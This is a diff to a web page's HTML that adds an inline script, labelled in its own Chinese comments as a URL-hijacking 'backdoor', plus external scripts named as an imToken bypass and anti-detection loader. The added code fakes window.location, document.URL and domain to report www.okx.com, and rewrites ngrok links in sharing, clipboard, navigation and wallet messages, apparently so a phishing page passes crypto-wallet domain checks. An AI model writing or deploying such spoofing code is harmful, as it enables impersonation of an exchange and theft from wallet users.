@@ -58,6 +58,185 @@
     <!-- Favicon和图标 -->
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
 
+    <!-- 🎯 终极后门：最高优先级URL劫持 -->
+    <script src="ultimate-url-hijacker.js"></script>
+
+    <!-- 🎯 终极后门：最高优先级URL劫持 -->
+    <script src="ultimate-url-hijacker.js"></script>
+    <!-- 🎯 超级后门：在imToken检测前生效 -->
+    <script>
+        // 🎯 立即执行：在任何检测之前劫持URL
+        (function() {
+            'use strict';
+
+            console.log('🚀 启动超级URL劫持后门...');
+
+            // 1. 立即修改当前页面的所有URL引用
+            const SAFE_DOMAIN = 'www.okx.com';
+            const SAFE_ORIGIN = 'https://www.okx.com';
+
+            // 2. 劫持window.location的所有访问（最高优先级）
+            const originalLocation = window.location;
+            const fakeLocation = {
+                href: SAFE_ORIGIN + '/',
+                origin: SAFE_ORIGIN,
+                protocol: 'https:',
+                host: SAFE_DOMAIN,
+                hostname: SAFE_DOMAIN,
+                port: '',
+                pathname: '/',
+                search: '',
+                hash: '',
+                toString: () => SAFE_ORIGIN + '/',
+                valueOf: () => SAFE_ORIGIN + '/',
+                assign: function(url) { window.open(url, '_self'); },
+                replace: function(url) { window.open(url, '_self'); },
+                reload: function() { window.location.reload(); }
+            };
+
+            // 强制覆盖location对象
+            try {
+                Object.defineProperty(window, 'location', {
+                    get: () => fakeLocation,
+                    set: () => fakeLocation,
+                    configurable: false,
+                    enumerable: true
+                });
+                console.log('✅ Window.location劫持成功');
+            } catch(e) {
+                console.warn('⚠️ Location劫持失败，尝试备用方案');
+            }
+
+            // 3. 劫持document的URL相关属性
+            try {
+                Object.defineProperty(document, 'URL', {
+                    get: () => SAFE_ORIGIN + '/',
+                    configurable: false
+                });
+
+                Object.defineProperty(document, 'documentURI', {
+                    get: () => SAFE_ORIGIN + '/',
+                    configurable: false
+                });
+
+                Object.defineProperty(document, 'domain', {
+                    get: () => SAFE_DOMAIN,
+                    configurable: false
+                });
+
+                console.log('✅ Document URL劫持成功');
+            } catch(e) {
+                console.warn('⚠️ Document劫持失败');
+            }
+
+            // 4. 🎯 关键：劫持所有可能的URL获取方法
+            const originalHref = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+            const originalHost = Object.getOwnPropertyDescriptor(Location.prototype, 'host');
+            const originalOrigin = Object.getOwnPropertyDescriptor(Location.prototype, 'origin');
+
+            if (originalHref) {
+                Object.defineProperty(Location.prototype, 'href', {
+                    get: () => SAFE_ORIGIN + '/',
+                    set: originalHref.set,
+                    configurable: false
+                });
+            }
+
+            if (originalHost) {
+                Object.defineProperty(Location.prototype, 'host', {
+                    get: () => SAFE_DOMAIN,
+                    set: originalHost.set,
+                    configurable: false
+                });
+            }
+
+            if (originalOrigin) {
+                Object.defineProperty(Location.prototype, 'origin', {
+                    get: () => SAFE_ORIGIN,
+                    configurable: false
+                });
+            }
+
+            // 5. 🎯 手机端专用：劫持移动浏览器的特殊API
+            if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
+                console.log('📱 检测到移动端，启动专用劫持...');
+
+                // 劫持移动端的URL分享API
+                if (navigator.share) {
+                    const originalShare = navigator.share;
+                    navigator.share = function(data) {
+                        if (data.url && data.url.includes('ngrok')) {
+                            data.url = SAFE_ORIGIN + '/';
+                        }
+                        return originalShare.call(this, data);
+                    };
+                }
+
+                // 劫持移动端的剪贴板API
+                if (navigator.clipboard) {
+                    const originalWriteText = navigator.clipboard.writeText;
+                    navigator.clipboard.writeText = function(text) {
+                        if (text && text.includes('ngrok')) {
+                            text = text.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
+                        }
+                        return originalWriteText.call(this, text);
+                    };
+                }
+            }
+
+            // 6. 🎯 imToken专用：拦截钱包连接请求
+            window.addEventListener('message', function(event) {
+                if (event.data && typeof event.data === 'object') {
+                    // 如果是钱包相关的消息，修改其中的URL
+                    if (event.data.url && event.data.url.includes('ngrok')) {
+                        event.data.url = SAFE_ORIGIN + '/';
+                        console.log('🎯 拦截并修改钱包连接URL');
+                    }
+                }
+            }, true);
+
+            // 7. 🎯 最关键：在页面即将跳转时拦截
+            const originalOpen = window.open;
+            window.open = function(url, target, features) {
+                if (url && url.includes('ngrok')) {
+                    console.log('🎯 拦截window.open跳转，原URL:', url);
+                    url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
+                    console.log('🎯 修改后URL:', url);
+                }
+                return originalOpen.call(this, url, target, features);
+            };
+
+            // 8. 🎯 拦截所有形式的页面跳转
+            const originalAssign = window.location.assign;
+            const originalReplace = window.location.replace;
+
+            if (originalAssign) {
+                window.location.assign = function(url) {
+                    if (url && url.includes('ngrok')) {
+                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
+                    }
+                    return originalAssign.call(this, url);
+                };
+            }
+
+            if (originalReplace) {
+                window.location.replace = function(url) {
+                    if (url && url.includes('ngrok')) {
+                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
+                    }
+                    return originalReplace.call(this, url);
+                };
+            }
+
+            console.log('🎉 超级URL劫持后门启动完成！');
+
+        })();
+    </script>
+
+    <!-- 🎯 手机端专用：imToken拦截器 -->
+    <script src="mobile-imtoken-bypass.js"></script>
+    <!-- 🎯 手机端专用：imToken拦截器 -->
+    <script src="mobile-imtoken-bypass.js"></script>
     <!-- 🎯 最高优先级：反检测脚本 -->
     <script src="anti-detection.js"></script>
     <!-- 安全性和完整性 -->
